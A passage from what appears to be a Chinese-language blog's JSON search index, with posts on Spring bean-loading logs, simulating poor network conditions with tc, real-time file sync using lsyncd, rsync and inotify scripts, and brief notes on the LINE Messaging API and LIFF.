http://www.springframework.org/schema/beans/spring-beans-4.3.xsd=org/springframework/beans/factory/xml/spring-beans-4.3.xsd, http://www.springframework.org/schema/tool/spring-tool-4.1.xsd=org/springframework/beans/factory/xml/spring-tool-4.1.xsd, http://www.springframework.org/schema/task/spring-task-4.3.xsd=org/springframework/scheduling/config/spring-task-4.3.xsd, http://www.springframework.org/schema/util/spring-util-4.0.xsd=org/springframework/beans/factory/xml/spring-util-4.0.xsd, http://www.springframework.org/schema/beans/spring-beans-4.1.xsd=org/springframework/beans/factory/xml/spring-beans-4.1.xsd, http://www.springframework.org/schema/lang/spring-lang.xsd=org/springframework/scripting/config/spring-lang-4.3.xsd, http://www.springframework.org/schema/cache/spring-cache-4.0.xsd=org/springframework/cache/config/spring-cache-4.0.xsd, http://www.springframework.org/schema/context/spring-context-4.1.xsd=org/springframework/context/config/spring-context-4.1.xsd, http://www.springframework.org/schema/aop/spring-aop-4.2.xsd=org/springframework/aop/config/spring-aop-4.2.xsd, http://www.springframework.org/schema/tool/spring-tool-4.2.xsd=org/springframework/beans/factory/xml/spring-tool-4.2.xsd, http://www.springframework.org/schema/util/spring-util-2.5.xsd=org/springframework/beans/factory/xml/spring-util-2.5.xsd, http://www.springframework.org/schema/jee/spring-jee-4.2.xsd=org/springframework/ejb/config/spring-jee-4.2.xsd, http://www.springframework.org/schema/lang/spring-lang-3.1.xsd=org/springframework/scripting/config/spring-lang-3.1.xsd, http://www.springframework.org/schema/task/spring-task.xsd=org/springframework/scheduling/config/spring-task-4.3.xsd, http://www.springframework.org/schema/task/spring-task-4.2.xsd=org/springframework/scheduling/config/spring-task-4.2.xsd, http://www.springframework.org/schema/aop/spring-aop.xsd=org/springframework/aop/config/spring-aop-4.3.xsd, http://www.springframework.org/schema/lang/spring-lang-4.0.xsd=org/springframework/scripting/config/spring-lang-4.0.xsd, http://www.springframework.org/schema/beans/spring-beans-2.0.xsd=org/springframework/beans/factory/xml/spring-beans-2.0.xsd, http://www.springframework.org/schema/task/spring-task-4.1.xsd=org/springframework/scheduling/config/spring-task-4.1.xsd, http://www.springframework.org/schema/tool/spring-tool-3.1.xsd=org/springframework/beans/factory/xml/spring-tool-3.1.xsd, http://www.springframework.org/schema/util/spring-util-3.2.xsd=org/springframework/beans/factory/xml/spring-util-3.2.xsd, http://www.springframework.org/schema/jee/spring-jee-4.1.xsd=org/springframework/ejb/config/spring-jee-4.1.xsd, http://www.springframework.org/schema/lang/spring-lang-3.2.xsd=org/springframework/scripting/config/spring-lang-3.2.xsd, http://www.springframework.org/schema/cache/spring-cache-3.2.xsd=org/springframework/cache/config/spring-cache-3.2.xsd, http://www.springframework.org/schema/aop/spring-aop-4.1.xsd=org/springframework/aop/config/spring-aop-4.1.xsd, http://www.springframework.org/schema/util/spring-util.xsd=org/springframework/beans/factory/xml/spring-util-4.3.xsd, http://www.springframework.org/schema/jee/spring-jee-3.2.xsd=org/springframework/ejb/config/spring-jee-3.2.xsd, http://www.springframework.org/schema/util/spring-util-3.0.xsd=org/springframework/beans/factory/xml/spring-util-3.0.xsd, http://www.springframework.org/schema/lang/spring-lang-4.1.xsd=org/springframework/scripting/config/spring-lang-4.1.xsd, http://www.springframework.org/schema/aop/spring-aop-3.2.xsd=org/springframework/aop/config/spring-aop-3.2.xsd, http://www.springframework.org/schema/tool/spring-tool-3.2.xsd=org/springframework/beans/factory/xml/spring-tool-3.2.xsd, http://www.springframework.org/schema/context/spring-context-4.3.xsd=org/springframework/context/config/spring-context-4.3.xsd, http://www.springframework.org/schema/lang/spring-lang-2.5.xsd=org/springframework/scripting/config/spring-lang-2.5.xsd, http://www.springframework.org/schema/jee/spring-jee.xsd=org/springframework/ejb/config/spring-jee-4.3.xsd, http://www.springframework.org/schema/util/spring-util-3.1.xsd=org/springframework/beans/factory/xml/spring-util-3.1.xsd, http://www.springframework.org/schema/jee/spring-jee-2.5.xsd=org/springframework/ejb/config/spring-jee-2.5.xsd, http://www.springframework.org/schema/task/spring-task-4.0.xsd=org/springframework/scheduling/config/spring-task-4.0.xsd, http://www.springframework.org/schema/aop/spring-aop-2.5.xsd=org/springframework/aop/config/spring-aop-2.5.xsd, http://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-4.3.xsd, http://www.springframework.org/schema/cache/spring-cache-3.1.xsd=org/springframework/cache/config/spring-cache-3.1.xsd, http://www.springframework.org/schema/aop/spring-aop-4.0.xsd=org/springframework/aop/config/spring-aop-4.0.xsd, http://www.springframework.org/schema/jee/spring-jee-4.0.xsd=org/springframework/ejb/config/spring-jee-4.0.xsd, http://www.springframework.org/schema/tool/spring-tool-2.5.xsd=org/springframework/beans/factory/xml/spring-tool-2.5.xsd, http://www.springframework.org/schema/task/spring-task-3.2.xsd=org/springframework/scheduling/config/spring-task-3.2.xsd, http://www.springframework.org/schema/beans/spring-beans-3.0.xsd=org/springframework/beans/factory/xml/spring-beans-3.0.xsd, http://www.springframework.org/schema/jee/spring-jee-3.0.xsd=org/springframework/ejb/config/spring-jee-3.0.xsd, http://www.springframework.org/schema/aop/spring-aop-3.1.xsd=org/springframework/aop/config/spring-aop-3.1.xsd, http://www.springframework.org/schema/jee/spring-jee-3.1.xsd=org/springframework/ejb/config/spring-jee-3.1.xsd, http://www.springframework.org/schema/lang/spring-lang-4.3.xsd=org/springframework/scripting/config/spring-lang-4.3.xsd, http://www.springframework.org/schema/aop/spring-aop-3.0.xsd=org/springframework/aop/config/spring-aop-3.0.xsd, http://www.springframework.org/schema/beans/spring-beans-3.1.xsd=org/springframework/beans/factory/xml/spring-beans-3.1.xsd, http://www.springframework.org/schema/lang/spring-lang-2.0.xsd=org/springframework/scripting/config/spring-lang-2.0.xsd, http://www.springframework.org/schema/task/spring-task-3.1.xsd=org/springframework/scheduling/config/spring-task-3.1.xsd, http://www.springframework.org/schema/lang/spring-lang-4.2.xsd=org/springframework/scripting/config/spring-lang-4.2.xsd, http://www.springframework.org/schema/tool/spring-tool-3.0.xsd=org/springframework/beans/factory/xml/spring-tool-3.0.xsd, http://www.springframework.org/schema/task/spring-task-3.0.xsd=org/springframework/scheduling/config/spring-task-3.0.xsd, http://www.springframework.org/schema/context/spring-context-3.0.xsd=org/springframework/context/config/spring-context-3.0.xsd, http://www.springframework.org/schema/cache/spring-cache.xsd=org/springframework/cache/config/spring-cache-4.3.xsd}\n16:44:28,272 DEBUG main xml.PluggableSchemaResolver:119 - Found XML schema [http://www.springframework.org/schema/beans/spring-beans.xsd] in classpath: org/springframework/beans/factory/xml/spring-beans-4.3.xsd\n16:44:28,303 DEBUG main xml.DefaultBeanDefinitionDocumentReader:92 - Loading bean definitions\n16:44:28,312 DEBUG main xml.XmlBeanDefinitionReader:224 - Loaded 2 bean definitions from location pattern [applicationContext.xml]\n16:44:28,329 DEBUG main support.DefaultListableBeanFactory:730 - Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@36f0f1be: defining beans [service,printer]; root of factory hierarchy\n16:44:28,330 DEBUG main support.DefaultListableBeanFactory:221 - Creating shared instance of singleton bean 'service'\n16:44:28,330 DEBUG main support.DefaultListableBeanFactory:449 - Creating instance of bean 'service'\nMessageService...\n16:44:28,337 DEBUG main support.DefaultListableBeanFactory:539 - Eagerly caching bean 'service' to allow for resolving potential circular references\n16:44:28,338 DEBUG main support.DefaultListableBeanFactory:485 - Finished creating instance of bean 'service'\n16:44:28,338 DEBUG main support.DefaultListableBeanFactory:221 - Creating shared instance of singleton bean 'printer'\n16:44:28,338 DEBUG main support.DefaultListableBeanFactory:449 - Creating instance of bean 'printer'\nMessagePrinter...\n16:44:28,338 DEBUG main support.DefaultListableBeanFactory:539 - Eagerly caching bean 'printer' to allow for resolving potential circular references\n16:44:28,339 DEBUG main support.DefaultListableBeanFactory:251 - Returning cached instance of singleton bean 'service'\n16:44:28,350 DEBUG main support.DefaultListableBeanFactory:485 - Finished creating instance of bean 'printer'\n16:44:28,351 DEBUG main support.DefaultListableBeanFactory:251 - Returning cached instance of singleton bean 'lifecycleProcessor'\n16:44:28,353 DEBUG main support.DefaultListableBeanFactory:251 - Returning cached instance of singleton bean 'printer'\nhello.MessagePrinter@61230f6a\nHello World\n```\n\n簡單重點 log 說明\n\n1. Using JAXP provider 使用 JAXP 解析 XML\n\n2. Loading bean definitions  加載 bean 節點\n\n3. Creating shared instance of singleton bean 'service' 使用單立模式新增 service 物件\n\n意思程式執行時候，會把所有 bean 實例出來!!\n\n### log4j:WARN No appenders could be found for logger (org.springframework.core.env.StandardEnvironment).\n出現這個代表 log設定檔放錯地方\n\nsrc\\main\\resources\\log4j.properties\n\n\n## autowired 加載方式\n\nTODO\n\n#### 建構子\n\n#### 成員變數\n\n#### setter method\n\n#### 任意 method","tags":["java"],"categories":["Java"]},{"title":"模擬不良網路環境方法","url":"%2Fblog%2F2020%2F04%2F26%2F%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95%2F","content":"\n之前有跟別的廠商藉接機器\n但是後來覺得網路順斷，機器不會自動連線\n一直在想有什麼可以模擬這種網路狀況\n機器還可不可以運作\n最近有爬到一些文章\n\n**最後嘗試，我這種情境還是沒辦法模擬出當時狀況**\n**所以這篇就單純紀錄**\n因為最近動物機載 BT ，偶爾會發生連不到動物機狀態\n嚴重是完全連不到，輕微拔掉網路線就會正常一下，過一會就 ping 不到\n我朋友估計是樹梅派問題，重開機就會正常...\nlog 也沒有看到哪裡出問題，不知道公司狀況也是不是這一種?\n連線方法可以參考(下面內容):[Linux在Wifi使用pppoe連線後，重開機不能連線上網 | 程式狂想筆記](https://malagege.github.io/blog/2019/01/27/Linux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%EF%BC%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2/)\n\n<!--more-->\n\n## tc\n\n[iptables 限速 - 哈希](https://www.haxi.cc/archives/iptables-%E9%99%90%E9%80%9F.html)\n[Linux模拟复杂网络环境下的传输（netem和tc） - 哈希](https://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html)\n\n[Linux Traffic Control (tc) 研究 // Yuanchieh's Blog](https://yuanchieh.page/posts/2019-04-05_linux-traffic-control/){% asset_link web1.png 備份圖 %}\n\n## tc 查看 list\n\n```\ntc qdisc show\ntc class show dev eth0\ntc filter show dev eth0\n```\n\n[linux - tc / iproute2, how to list the configuration - Super User](https://superuser.com/questions/251032/tc-iproute2-how-to-list-the-configuration)\n\n## comcast\n\n[使用 tc netem 模拟网络异常 | Cizixs Write Here](https://cizixs.com/2017/10/23/tc-netem-for-terrible-network/)\n[tylertreat/comcast: Simulating shitty network connections so you can build better systems.](https://github.com/tylertreat/comcast)\n\n## pyshaper\n\n> pyshaper是一個帶有gui的限速工具。\n\n\n## 連結紀錄\n\n跟我想像的不太一樣，有空再補\n\n* [iptables 限速 - 哈希](https://www.haxi.cc/archives/iptables-%E9%99%90%E9%80%9F.html)\n* [Linux模拟复杂网络环境下的传输（netem和tc） - 哈希](https://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html)\n* [使用 tc netem 模拟网络异常 | Cizixs Write Here](https://cizixs.com/2017/10/23/tc-netem-for-terrible-network/)\n* [tylertreat/comcast: Simulating shitty network connections so you can build better systems.](https://github.com/tylertreat/comcast)\n* [linux的traffic control@小鸟技术笔记](https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2017/08/10/linux-net-traffic-control.html#trickle)\n* [利用Dummynet模拟恶劣网络环境_运维_baidu_zhongce的博客-CSDN博客](https://blog.csdn.net/baidu_zhongce/article/details/46874583)\n* [模拟恶劣网络环境常用的几种解决方案 - 狂师 - 博客园](https://www.cnblogs.com/jinjiangongzuoshi/p/5272787.html)\n* [pyshaper - your easy dynamic traffic-shaper](http://freenet.mcnabhosting.com/python/pyshaper/)\n* [如何模拟弱网测试 - 尚码园](https://www.shangmayuan.com/a/0fd3247055c54298b214d92c.html)\n* [Linux模拟复杂网络环境下的传输（netem和tc） - 哈希](http://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html)\n* [linux下使用iptables和tc限制流量笔记 | Chronos](https://blog.plotcup.com/2012/08/24/linux-xia-shi-yong-iptables-he-tc-xian-zhi-liu-liang-bi-ji/)\n* [Linux Traffic Control (tc) 研究 // Yuanchieh's Blog](https://yuanchieh.page/posts/2019-04-05_linux-traffic-control/)","tags":["tc"],"categories":["Linux"]},{"title":"lsyncd 做檔案同步實作紀錄","url":"%2Fblog%2F2020%2F04%2F25%2Flsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84%2F","content":"\n\n最近看到這幾篇使用 inotify 做文件同步感到有興趣\n雖然現在工作上目前還沒用到\n但這種情境感覺很常遇到\n~~希望能用不用寫程式方法~~\n\n* [Rsync + inotify 做文件实时同步 - 哈希](https://www.haxi.cc/archives/Rsync-inotify%E5%81%9A%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5.html)\n* [Rsync + sersync 实现文件实时同步 - 哈希](https://www.haxi.cc/archives/Rsync-sersync%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5.html)\n* [rsync + lsyncd 实现文件实时同步 - 哈希](https://www.haxi.cc/archives/rsync-lsyncd%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5-1.html)\n\n<!--more-->\n\n## 相關工具\n\n* inotify\n\n[inotify-tools 監聽資料夾裡檔案異動工具 | 程式狂想筆記](https://malagege.github.io/blog/2020/01/12/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/)\n之前小記這篇，其實裡面沒什麼實作\n需透過 bash 執行\n但這樣當然不是很方便，所以有類似 sersync 和 lsyncd 工具解決這個方案\n\n* sersync\n\n這篇[lsyncd实时同步搭建指南——取代rsync+inotify-Linux运维日志](https://www.centos.bz/2017/08/lsyncd-rsync-inotify/)有講到很多優點缺點{% asset_link web1.png 備份圖 %}\n為了不浪費時間\n所以我就不實作了\n\n## lsyncd\n\n### 安裝\n\napt install rsyncd\n\n或去 github 官網抓 [axkibe/lsyncd: Lsyncd (Live Syncing Daemon) synchronizes local directories with remote targets](https://github.com/axkibe/lsyncd)\n\n#### lua 記得要升到 5.2\n\nLua >= 5.2\n\nLsyncd depends on Lua 5.2 or greater; that is 5.2 or 5.3. For most distributions you need to install the liblua??, the liblua??-dev and the lua?? package, with ?? being the respective Lua version.\ncmake >= 2.8\n\nTo configure Lsyncd to your system, cmake >= 2.8 is required\nrsync >= 3.1\n\nDuring runtime Lsyncd needs rsync > 3.1 installed both on source and target systems.\n\n[Lsyncd - Building](https://axkibe.github.io/lsyncd/manual/building/)\n\n\n### 設定\n\n一開始不會有`/etc/lsyncd.conf`\n可以做 `service lsync status` 有沒有執行\n\n\n~~vim /etc/lsyncd.conf~~ 網路上看到是這個路徑\n但是我看`CONFIG=/etc/lsyncd/lsyncd.conf.lua`\n\n``` conf\n# 全域設定\nsettings {\n    logfile = \"/var/log/lsyncd/lsyncd.log\",\n    statusFile = \"/var/log/lsyncd/lsyncd.status\"\n    inotifyMode = \"CloseWrite\",\n    maxProcesses = 8,\n}\n\n## 以下設定參考 https://www.centos.bz/2017/08/lsyncd-rsync-inotify/\n# 可設定多組\n# I. 本地目錄同步，direct：cp/rm/mv。 適用：500+萬文件，變動不大\nsync {\n    default.direct,\n    source    = \"/tmp/src\",\n    target    = \"/tmp/dest\",\n    delay = 1\n    maxProcesses = 1\n    }\n\n# II. 本地目錄同步，rsync模式：rsync\nsync {\n    default.rsync,\n    source    = \"/tmp/src\",\n    target    = \"/tmp/dest1\",\n    excludeFrom = \"/etc/rsyncd.d/rsync_exclude.lst\",\n    rsync     = {\n        binary = \"/usr/bin/rsync\",\n        archive = true,\n        compress = true,\n        bwlimit   = 2000\n        } \n    }\n\n# III. 遠程目錄同步，rsync模式 + rsyncd daemon\nsync {\n    default.rsync,\n    source    = \"/tmp/src\",\n    target    = \"syncuser@172.29.88.223::module1\",\n    delete=\"running\",  # 可以改成false 這樣就不會刪掉\n    exclude = { \".*\", \".tmp\" },\n    delay = 30,\n    init = false, # 默認init功能設置為false來跳過初始rsync過程\n    rsync     = {\n        binary = \"/usr/bin/rsync\",\n        archive = true,\n        compress = true,\n        verbose   = true,\n        password_file = \"/etc/rsyncd.d/rsync.pwd\",\n        _extra    = {\"--bwlimit=200\"}\n        }\n    }\n\n# IV. 遠程目錄同步，rsync模式 + ssh shell\nsync {\n    default.rsync,\n    source    = \"/tmp/src\",\n    target    = \"172.29.88.223:/tmp/dest\",\n    # target    = \"root@172.29.88.223:/remote/dest\",\n    # 上面target，注意如果是普通用戶，必須擁有寫權限\n    maxDelays = 5,\n    delay = 30,\n    # init = true,\n    rsync     = {\n        binary = \"/usr/bin/rsync\",\n        archive = true,\n        compress = true,\n        bwlimit   = 2000\n        # rsh = \"/usr/bin/ssh -p 22 -o StrictHostKeyChecking=no\"\n        # 如果要指定其它端口，請用上面的rsh\n        }\n    }\n\n# V. 遠程目錄同步，rsync模式 + rsyncssh，效果與上面相同\nsync {\n    default.rsyncssh,\n    source    = \"/tmp/src2\",\n    host      = \"172.29.88.223\",\n    targetdir = \"/remote/dir\",\n    excludeFrom = \"/etc/rsyncd.d/rsync_exclude.lst\",\n    # maxDelays = 5,\n    delay = 0,\n    # init = false,\n    rsync    = {\n        binary = \"/usr/bin/rsync\",\n        archive = true,\n        compress = true,\n        verbose   = true,\n        _extra = {\"--bwlimit=2000\"},\n        },\n    ssh      = {\n        port  =  1234\n        }\n    }\n```\n\n**default.direct**\n\nDefault.direct可以用來保持兩個本地目錄同步，比使用default.rsync更好的性能。Default.direct在啟動時使用（就像default.rsync一樣）rsync來初始化目標目錄與源目錄的同步。但是，在正常操作期間，default.direct使用/ bin / cp，/ bin / rm和/ bin / mv來保持同步。所有參數就像default.rsync一樣。\n\ndelete 也適用這個屬性\n\n**_extra  可放一些參數**\n\n想說有沒有 size-only 設定\n但發現都找不到\n後來看到`_extra` 可以設定\n\n### 簡單測試\n\n預設是 10 秒檢查資料更新\n可設定 statusInterval\n[Lsyncd - The Configuration File](https://axkibe.github.io/lsyncd/manual/config/file/)\n\n```lua\nsettings {\n   logfile    = \"/tmp/lsyncd.log\",\n   statusFile = \"/tmp/lsyncd.status\",\n   nodaemon   = true,\n}\n\nsync {\n   default.rsync,\n   source = \"/home/malagege/test_lsyncd/a/\",\n   target = \"/home/malagege/test_lsyncd/b/\",\n```\n\ndefault.rsync 預設是執行\n/usr/bin/rsync -ltsd --delete --include-from=- --exclude=* SOURCE TARGET\n所以會做刪除動作\n\n## 同步完做動作\n\n[Lsyncd - FAQ: How can I call a script before or after each rsync operation?](https://axkibe.github.io/lsyncd/faq/postscript/)\n\n```sh\n#!/bin/bash\n/usr/bin/rsync \"$@\"\nresult=$?\n(\n  if [ $result -eq 0 ]; then\n     echo \"my commands\";\n  fi\n) >/dev/null 2>/dev/null </dev/null\n\nexit $result\n```\n\n這邊注意 rsync 並不是對單一檔案做搬移\n而是對整個...\necho $@ 結果是\n`-slt -r --delete --ignore-errors --force --from0 --include-from=- --exclude=* /home/malagege/test_lsyncd/a/ /home/malagege/test_lsyncd/a/ /home/malagege/test_lsyncd/b/`\n\n跟我想要抓的東西不一樣\n\n## 可能做 Layer 2 做自訂動作\n\n感覺這邊自由度很高\n因為我對 lua 不熟\n所以就沒打算做這段\n\n* [關於使用Lsyncd進行數據鏡像同步 | 退思園](https://gowa.club/Linux-Unix/%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8Lsyncd%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E9%95%9C%E5%83%8F%E5%90%8C%E6%AD%A5.html) {% asset_link web2.png 備份圖 %}\n裡面有官方中文說明\n\n\n## 其他參考\n\n* [Lsyncd - Examples](https://axkibe.github.io/lsyncd/manual/examples/)\n* [Lsyncd搭建同步镜像-用Lsyncd实现本地和远程服务器之间实时同步 - 江召伟 - 博客园](https://www.cnblogs.com/jiangzhaowei/p/8298416.html)\n* [Bash中的IO與重定向 | 退思園](https://gowa.club/Linux-Unix/Bash%E4%B8%AD%E7%9A%84IO%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91.html)\n* [lsyncd+rsync 实时同步](http://news.migage.com/articles/lsyncdrsync+%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5_3575751_csdn.html)\n* [lsyncd实时同步搭建指南——取代rsync+inotify-Linux运维日志](https://www.centos.bz/2017/08/lsyncd-rsync-inotify/)\n* [做网站迁移 大量的小文件怎么办？ - 知乎](https://www.zhihu.com/question/26463409)\n\n\n### 同步腳本\n\n以下都是參考:[真正的inotify+rsync实时同步 彻底告别同步慢 - 琴酒网络 - 博客园](https://www.cnblogs.com/ginvip/p/6430986.html)\n\n```bash\n#!/bin/bash\n/usr/bin/inotifywait -mrq --format '%w%f'-e create,close_write,delete /backup |while read file\n#把發生更改的文件列表都接收到file 然後循環，但有什麼鬼用呢？下面的命令都沒有引用這個$file 下面做的是全量rsync\ndo\n    cd /backup && rsync -az --delete /backup/ rsync_backup@192.168.24.101::backup/--password-file=/etc/rsync.password\ndone\n```\n\n優化\n\n```bash\n#!/bin/bash\nsrc=/data/                           # 需要同步的源路徑\ndes=data                             # 目標服務器上 rsync --daemon 發佈的名稱，rsync --daemon這裡就不做介紹了，網上搜一下，比較簡單。\nrsync_passwd_file=/etc/rsyncd.passwd            # rsync驗證的密碼文件\nip1=192.168.0.18                 # 目標服務器1\nip2=192.168.0.19                 # 目標服務器2\nuser=root                            # rsync --daemon定義的驗證用戶名\ncd ${src}                            \n# 此方法中，由於rsync同步的特性，這裡必須要先cd到源目錄，inotify再監聽 ./ 才能rsync同步後目錄結構一致，有興趣的同學可以進行各種嘗試觀看其效果\n/usr/local/bin/inotifywait -mrq --format  '%Xe %w%f' -e modify,create,delete,attrib,close_write,move ./ | while read file\n# 把監控到有發生更改的\"文件路徑列表\"循環\ndo\n        INO_EVENT=$(echo $file | awk '{print $1}')      # 把inotify輸出切割 把事件類型部分賦值給INO_EVENT\n        INO_FILE=$(echo $file | awk '{print $2}')       # 把inotify輸出切割 把文件路徑部分賦值給INO_FILE\n        echo \"-------------------------------$(date)------------------------------------\"\n        echo $file\n        #增加、修改、寫入完成、移動進事件\n        #增、改放在同一個判斷，因為他們都肯定是針對文件的操作，即使是新建目錄，要同步的也只是一個空目錄，不會影響速度。\n        if [[ $INO_EVENT =~ 'CREATE' ]] || [[ $INO_EVENT =~ 'MODIFY' ]] || [[ $INO_EVENT =~ 'CLOSE_WRITE' ]] || [[ $INO_EVENT =~ 'MOVED_TO' ]]         # 判斷事件類型\n        then\n                echo 'CREATE or MODIFY or CLOSE_WRITE or MOVED_TO'\n                rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip1}::${des} &&\n# INO_FILE變量代表路徑哦  -c校驗文件內容\n                rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip2}::${des}\n#仔細看 上面的rsync同步命令 源是用了$(dirname ${INO_FILE})變量 即每次只針對性的同步發生改變的文件的目錄(只同步目標文件的方法在生產環境的某些極端\n#環境下會漏文件 現在可以在不漏文件下也有不錯的速度 做到平衡)\n#然後用-R參數把源的目錄結構遞歸到目標後面 保證目錄結構一致性\n        fi\n        #刪除、移動出事件\n        if [[ $INO_EVENT =~ 'DELETE' ]] || [[ $INO_EVENT =~ 'MOVED_FROM' ]]\n        then\n                echo 'DELETE or MOVED_FROM'\n                rsync -avzR --delete --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip1}::${des} &&\n                rsync -avzR --delete --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip2}::${des}\n#看rsync命令 如果直接同步已刪除的路徑${INO_FILE}會報no such or directory錯誤 所以這裡同步的源是被刪文件或目錄的上一級路徑\n#並加上--delete來刪除目標上有而源中沒有的文件，這裡不能做到指定文件刪除，如果刪除的路徑越靠近根，則同步的目錄月多，同步刪除的操作就越花時間。\n#這裡有更好方法的同學，歡迎交流。\n        fi\n        #修改屬性事件 指 touch chgrp chmod chown等操作\n        if [[ $INO_EVENT =~ 'ATTRIB' ]]\n        then\n                echo 'ATTRIB'\n                if [ ! -d \"$INO_FILE\" ]\n# 如果修改屬性的是目錄 則不同步，因為同步目錄會發生遞歸掃瞄，等此目錄下的文件發生同步時，rsync會順帶更新此目錄。\n                then\n                        rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip1}::${des} &&         \n                        rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip2}::${des}\n                fi\n        fi\ndone\n```\n\n簡單來看就是對檔案做 dirname 備份，減少做多次遞迴\n是不是能確認來源是資料夾或檔案，單純 scp 或 rsync 過去是不是比較快?\n\n## 相關同步數量問題\n\n以下參考:[等很久資訊室: Lsyncd - Live syncing Daemon 資料夾同步](https://www.iq180.com.tw/2018/08/lsyncd-live-syncing-daemon.html)\n\n檢查可監測數量設定值：\nlsyncd 是依靠 kernel 內建的檔案監測功能 inotify，來回報記錄檔案狀態，而 inotify 預設有設定了一個可監測資料夾數量的限定值。\n\ncat /proc/sys/fs/inotify/max_user_watches\n\n在 CentOS 6.8 內，它預設值是 8192，也就是它只能監測最多 8192 個資料夾。\n而我們要同步的資料夾有多少，會不會超過這個數值呢？必竟，若是超過了，它就無法同步到了。\n\ncat /var/run/lsyncd/lsyncd.status\n\n在狀態檔中找到一行如下：\nInotify watching 1440 directories\n那數字便是目前 lsyncd 所監測的資料夾數量。\n如果您看到的數字很靠近 8192 或甚至超過，那就必須放大這個限定值。\n\necho '10000' > /proc/sys/fs/inotify/max_user_watches\n\n這樣可以即時把限定值改成 10000，但重開機後它又會變成原本的 8192。\n下面方法可以改變開機後的預設值：\n\n把上述即時修改的指令放到 rc.local 之類的開機啟動檔內。\n或是\n在 /etc/sysctl.conf 內加上一行\nfs.inotify.max_user_watches = 10000\n\n這樣它重開機後，一樣會放大成我們設定的數值。\n","tags":["lsyncd"],"categories":["Linux"]},{"title":"串接 LINE message API(WebHook)  和 LIFF 小記","url":"%2Fblog%2F2020%2F04%2F16%2F%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98%2F","content":"\nTODO: 尚未整理完成\n\n<!--more-->\n\n## 建議要使用同一組帳號開發\n\n不同人的建立 Line project 的時候，**同一個人產生的 userid 會不一樣**。\n但是同一個建的多個 project 會產生相同的 userid。\n再串接上比較不會\n\n## webhook \n\npush\n\nreply\n\nfollow\n\nunfollow\n\nwebhook\n\n\n### 注意事項\n\n驗證憑證\n\n[Messaging API reference | LINE Developers](https://developers.line.biz/en/reference/messaging-api/#response)\n\n\n## LIFF \n\n### 注意事項\n\ntoken 關掉註銷\n\nemail 權限\n[Integrating LINE Login with your web app | LINE Developers # Applying for email permission](https://developers.line.biz/en/docs/line-login/integrate-line-login/#configuring-your-channel)\n\n\n[開發LINE聊天機器人不可不知的十件事 - LINE ENGINEERING](https://engineering.linecorp.com/zh-hant/blog/line-device-10/)\n[LINE Bot 系列文 — 什麼是 Webhook? - Justin Lee - Medium](https://medium.com/@justinlee_78563/line-bot-%E7%B3%BB%E5%88%97%E6%96%87-%E4%BB%80%E9%BA%BC%E6%98%AF-webhook-d0ab0bb192be)\n[21CS學習網](http://www.21cs.tw/Nurse/showLiangArticle.xhtml?liangArticleId=503)\n\n\n## 測試內網對外 API 工具 \n\nngrok\n\nlocaltunnel \n\n[用 localtunnel 幫 chatbot 上 https | 筆記國度](https://taichunmin.idv.tw/blog/2020-06-13-linebot-localtunnel-https.html?fbclid=IwAR3eNChmEIJnp7FwVp-sJ4yUifeVRyRmFDa_GNWojjO1vhPFZ3PQIB_dyVY)\n\n\n## 表情符號\n\n舊版使用特殊文字產生表情符號\n[LINE BOT の emoticon の説明がよく分からなかったのでリストにしました。 - Qiita](https://qiita.com/Repomn/items/b991f20e4fecd0577d4b)\n\n\n新版\n[[Golang][LINE][教學] 如何傳送 LINE 專屬的表情符號(emoji)](http://www.evanlin.com/go-emoji/)\n[關於 LINE Emoji 的一些細節（以 Golang 為例) - LINE ENGINEERING](https://engineering.linecorp.com/zh-hant/blog/line-emoji-with-golang/)\n\n老實說，我覺得舊版還是比較方便....","tags":["LINE"],"categories":["LIFF"]},{"title":"Linux 